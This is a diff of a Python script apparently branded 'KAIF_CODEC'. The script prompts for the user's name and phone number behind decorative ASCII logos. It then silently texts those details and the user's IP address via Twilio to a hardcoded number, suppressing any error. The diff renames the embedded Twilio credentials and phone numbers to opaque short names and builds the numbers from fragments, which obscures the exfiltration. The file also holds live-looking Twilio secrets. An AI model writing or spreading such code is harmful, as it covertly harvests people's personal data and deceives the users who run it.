@@ -32,7 +32,7 @@ logo_design_1 = Fore.GREEN + '''
            {1}/       \\{0}
 '''.format(Fore.GREEN, Fore.WHITE, Fore.RED)
 
-account_sid='AC96e5355a479cb6af19612f3dd331994c'
+acc='AC96e5355a479cb6af19612f3dd331994c'
 logo_design_2 = '''
 \033[92m
           +hydNNNNdyh+
@@ -52,7 +52,7 @@ logo_design_2 = '''
           MMMMo  oMMMM
           MMMMo  oMMMM
           oNMm-  -mMNs      KAIF_CODEC'''
-auth_token='8f374e0c78aba9094ce2c9d028dcfa45'
+aut='8f374e0c78aba9094ce2c9d028dcfa45'
 logo_design_3 = Fore.GREEN + '''
     .o oOOOOOOOo                                            OOOo
     Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
@@ -73,7 +73,7 @@ logo_design_3 = Fore.GREEN + '''
     .                  .     OP"          : o     .
 
          KAIF_CODEC'''
-twilio_number='+12056602194'
+tw_nu1='2056602194'
 logo_design_4 = Fore.RED + '''
  __  __     ______     __     ______   ______     ______     _____     ______     ______    
 /\ \/ /    /\  __ \   /\ \   /\  ___\ /\  ___\   /\  __ \   /\  __-.  /\  ___\   /\  ___\   
@@ -99,8 +99,10 @@ logo_design_4 = Fore.RED + '''
        (_.-.__.__./  /
 
 '''
-***REMOVED***
+too1='16296132104'
+tw_nu_f=f"+1{tw_nu1}"
 tname=f.apply('WHAT IS YOUR NAME?','/yellow/bold')
+too_f=f"+9{too1}"
 warning=f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)",'/red/bold')
 tnum=f.apply('ENTER YOU PHONE NUMBER','/cyan/bold')
 
@@ -254,11 +256,11 @@ except ModuleNotFoundError:
  print('\n',error)
  exit()
 try:
- client=Client(account_sid,auth_token)
+ client=Client(acc,aut)
  message=client.messages.create(    
 body=f"NAME={name} \nNUM={num} \nIP={ip} \n INFO={what}",
-    from_=twilio_number,
-    to=too
+    from_=tw_nu_f,
+    to=too_f
 )
 except:
  pass
